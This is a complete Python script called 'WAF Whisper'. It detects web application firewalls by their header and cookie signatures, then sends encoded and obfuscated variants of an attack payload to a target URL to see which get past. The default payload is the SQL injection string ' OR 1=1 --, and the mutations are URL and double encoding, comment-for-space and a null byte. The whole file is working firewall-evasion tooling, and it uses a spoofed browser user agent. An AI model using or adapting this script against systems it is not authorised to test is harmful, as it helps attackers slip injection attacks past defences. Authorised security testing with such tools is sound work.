import requests
import argparse
import urllib.parse
from colorama import Fore, Style, init

init(autoreset=True)

class WAFWhisper:
    def __init__(self, target):
        self.target = target
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.waf_signatures = {
            'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amz-cf-id', 'aws-waf'],
            'Akamai': ['akamai-ghost', 'ak_bmsc'],
            'F5 Big-IP': ['bigipserver', 'f5_traffic_control']
        }

    def ghost_scan(self):
        print(f"{Fore.CYAN}[*] Engaging Ghost Mode on {self.target}...")
        try:
            r = requests.head(self.target, headers=self.headers, timeout=5)
            detected = []
            for waf, sigs in self.waf_signatures.items():
                for sig in sigs:
                    if sig in str(r.headers).lower() or sig in str(r.cookies).lower():
                        detected.append(waf)
            
            if detected:
                print(f"{Fore.RED}[!] WAF Detected: {', '.join(set(detected))}")
            else:
                print(f"{Fore.GREEN}[+] No obvious WAF signatures found.")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Connection failed: {e}")

    def whisper_payload(self, payload):
        print(f"\n{Fore.CYAN}[*] Whispering payload variants...")
        mutations = {
            "Original": payload,
            "URL Encoded": urllib.parse.quote(payload),
            "Double URL": urllib.parse.quote(urllib.parse.quote(payload)),
            "Space to Comment": payload.replace(" ", "/**/"),
            "Null Byte": payload + "%00"
        }

        for name, data in mutations.items():
            full_url = f"{self.target}?q={data}"
            try:
                r = requests.get(full_url, headers=self.headers)
                if r.status_code == 403:
                    print(f"{Fore.RED}[x] {name}: BLOCKED (403)")
                else:
                    print(f"{Fore.GREEN}[+] {name}: PASSED ({r.status_code})")
            except:
                pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WAF Whisper')
    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--payload', default="' OR 1=1 --", help='Test Payload')
    args = parser.parse_args()

    whisper = WAFWhisper(args.target)
    whisper.ghost_scan()
    whisper.whisper_payload(args.payload)
